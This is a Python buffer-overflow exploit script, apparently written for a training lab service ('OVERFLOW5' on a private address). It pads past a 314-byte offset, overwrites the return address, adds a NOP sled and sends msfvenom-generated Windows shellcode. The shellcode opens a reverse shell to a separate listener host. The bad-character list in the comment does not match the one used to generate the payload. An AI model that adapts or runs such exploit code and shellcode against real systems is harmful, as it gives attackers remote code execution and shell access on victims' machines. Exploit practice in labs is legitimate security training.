#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 16

# Badchars: \x00\x16\x2f\xf4\xfd
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c
payload = (
"\xfc\xbb\x6b\xf7\xa9\xa8\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x97\x1f\x2b"
"\xa8\x67\xe0\x4c\x20\x82\xd1\x4c\x56\xc7\x42\x7d\x1c\x85"
"\x6e\xf6\x70\x3d\xe4\x7a\x5d\x32\x4d\x30\xbb\x7d\x4e\x69"
"\xff\x1c\xcc\x70\x2c\xfe\xed\xba\x21\xff\x2a\xa6\xc8\xad"
"\xe3\xac\x7f\x41\x87\xf9\x43\xea\xdb\xec\xc3\x0f\xab\x0f"
"\xe5\x9e\xa7\x49\x25\x21\x6b\xe2\x6c\x39\x68\xcf\x27\xb2"
"\x5a\xbb\xb9\x12\x93\x44\x15\x5b\x1b\xb7\x67\x9c\x9c\x28"
"\x12\xd4\xde\xd5\x25\x23\x9c\x01\xa3\xb7\x06\xc1\x13\x13"
"\xb6\x06\xc5\xd0\xb4\xe3\x81\xbe\xd8\xf2\x46\xb5\xe5\x7f"
"\x69\x19\x6c\x3b\x4e\xbd\x34\x9f\xef\xe4\x90\x4e\x0f\xf6"
"\x7a\x2e\xb5\x7d\x96\x3b\xc4\xdc\xff\x88\xe5\xde\xff\x86"
"\x7e\xad\xcd\x09\xd5\x39\x7e\xc1\xf3\xbe\x81\xf8\x44\x50"
"\x7c\x03\xb5\x79\xbb\x57\xe5\x11\x6a\xd8\x6e\xe1\x93\x0d"
"\x20\xb1\x3b\xfe\x81\x61\xfc\xae\x69\x6b\xf3\x91\x8a\x94"
"\xd9\xb9\x21\x6f\x8a\x05\x1d\x6f\x1c\xee\x5c\x6f\x83\xc7"
"\xe9\x89\xa9\x07\xbc\x02\x46\xb1\xe5\xd8\xf7\x3e\x30\xa5"
"\x38\xb4\xb7\x5a\xf6\x3d\xbd\x48\x6f\xce\x88\x32\x26\xd1"
"\x26\x5a\xa4\x40\xad\x9a\xa3\x78\x7a\xcd\xe4\x4f\x73\x9b"
"\x18\xe9\x2d\xb9\xe0\x6f\x15\x79\x3f\x4c\x98\x80\xb2\xe8"
"\xbe\x92\x0a\xf0\xfa\xc6\xc2\xa7\x54\xb0\xa4\x11\x17\x6a"
"\x7f\xcd\xf1\xfa\x06\x3d\xc2\x7c\x07\x68\xb4\x60\xb6\xc5"
"\x81\x9f\x77\x82\x05\xd8\x65\x32\xe9\x33\x2e\x52\x08\x91"
"\x5b\xfb\x95\x70\xe6\x66\x26\xaf\x25\x9f\xa5\x45\xd6\x64"
"\xb5\x2c\xd3\x21\x71\xdd\xa9\x3a\x14\xe1\x1e\x3a\x3d\xe1"
"\xa0\xc4\xbe"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")